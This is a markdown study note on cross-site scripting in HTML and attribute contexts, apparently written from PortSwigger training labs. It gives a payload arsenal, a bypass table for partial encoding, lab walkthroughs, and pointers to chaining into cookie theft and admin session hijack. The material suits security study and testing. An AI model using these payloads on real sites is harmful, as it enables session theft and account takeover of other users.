# XSS — HTML and attribute context

Input reflected directly into HTML or into an attribute value. The key skill is reading the source context and choosing a payload that doesn't require forbidden characters.

## Quick reference
```
# Raw HTML context (nothing encoded)
<script>alert(1)</script>
<img src=1 onerror=alert(1)>

# Attribute value context (angle brackets encoded — break out of value with ")
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

# href attribute (double quotes encoded — use javascript: URI)
javascript:alert(1)
```

## Root cause
Server reflects user input without HTML-encoding it (or only partially encodes some characters). In raw HTML context, the browser parses `<script>` as a new tag. In attribute context, injecting `"` closes the attribute value, allowing insertion of new attributes. In `href`, the `javascript:` protocol is executed when the link is clicked.

## Find it
1. Submit a unique string and view source — observe exactly where it appears.
2. Is it inside a tag attribute? Check which chars are encoded: try `"<>'`.
3. If `<>` encoded but `"` not → attribute break-out.
4. If the attribute is `href` or `src` → try `javascript:alert(1)`.
5. If nothing is encoded → raw HTML context → `<script>alert(1)</script>`.

## Technique
**Raw HTML:** Just inject `<script>alert(1)</script>` or any tag with an event handler.

**Attribute value (angle brackets encoded):**
- Your input lands inside `<input value="YOUR-INPUT">` or `<img alt="YOUR-INPUT">`.
- Payload `" onmouseover="alert(1)` turns it into: `<input value="" onmouseover="alert(1)">`
- The first `"` closes the original attribute; `onmouseover="alert(1)"` adds a new event handler; the remaining `"` (from the original close) becomes attribute-less noise (ignored or errors gracefully).

**Anchor href (double quotes encoded):**
- Your input lands in `<a href="YOUR-INPUT">` (website field in comment).
- `javascript:alert(1)` — no quotes needed; clicking the link runs it.

## Payload arsenal
```html
<!-- Raw HTML -->
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<body onload=alert(1)>

<!-- Attribute break-out -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onblur="alert(1)" x="

<!-- href / src -->
javascript:alert(document.cookie)
javascript:alert(1)
```

## Bypasses
| Defense | Bypass |
|---|---|
| `<>` HTML-encoded | Don't need them — use `"` to break out of attribute |
| `"` HTML-encoded in href | `javascript:alert(1)` doesn't use quotes |
| script-tag blocked | Use `<img onerror>`, `<svg onload>`, `<body onload>` |

## Exploitation walkthrough
**Reflected XSS nothing encoded:** type `<script>alert(1)</script>` in search box → page executes it.

**Stored XSS nothing encoded:** post blog comment with `<script>alert(1)</script>` as body → every viewer executes it.

**Attribute break-out:** submit `" onmouseover="alert(1)` → source shows `value="" onmouseover="alert(1)"` → hover over element → alert fires.

**Stored href XSS:** post comment with `javascript:alert(1)` as the website URL → "Website" link on post renders `<a href="javascript:alert(1)">` → click link → alert.

## Chaining
- Raw HTML XSS → [Exploiting-XSS](../Exploiting-XSS/) (steal cookies, bypass CSRF)
- Stored in admin-visible area → admin session hijack → [Access-control](../../Access-control/)

## Tools
- **Burp Repeater** — test payload and observe reflected output
- **View source** — confirm context and verify injection

## Labs

### Reflected XSS into HTML context with nothing encoded [Apprentice]
Search box reflects input directly into HTML. `<script>alert(1)</script>` → lab solved. Key insight: no encoding at all — most basic XSS context.

### Stored XSS into HTML context with nothing encoded [Apprentice]
Blog comment body reflected into HTML. `<script>alert(1)</script>` in comment → every page view executes. Key insight: stored = triggers for all viewers, not just the attacker.

### Reflected XSS into attribute with angle brackets HTML-encoded [Apprentice]
Input reflects inside `value="..."` attribute. `<>` encoded. Payload `" onmouseover="alert(1)` — close value with `"`, add event handler. Key insight: angle brackets not needed to break out of an attribute; `"` suffices.

### Stored XSS into anchor href attribute with double quotes HTML-encoded [Apprentice]
Website field in comment stored in `<a href="...">`. `"` is encoded. Use `javascript:alert(1)` — no quotes needed; protocol handler executed on click. Key insight: `javascript:` URI is a valid payload for any `href` sink even when quotes are blocked.

## Real-world notes
- Attribute break-out with `"` is one of the most common XSS patterns in real apps.
- `javascript:` URIs in `href` appear in frameworks that set dynamic link targets from user-controlled data (redirect URLs, profile URLs, etc.).
- Always check the `href` attribute of links and the `src` attribute of iframes for user-controlled values.

## References
- https://portswigger.net/web-security/cross-site-scripting/reflected
- https://portswigger.net/web-security/cross-site-scripting/stored
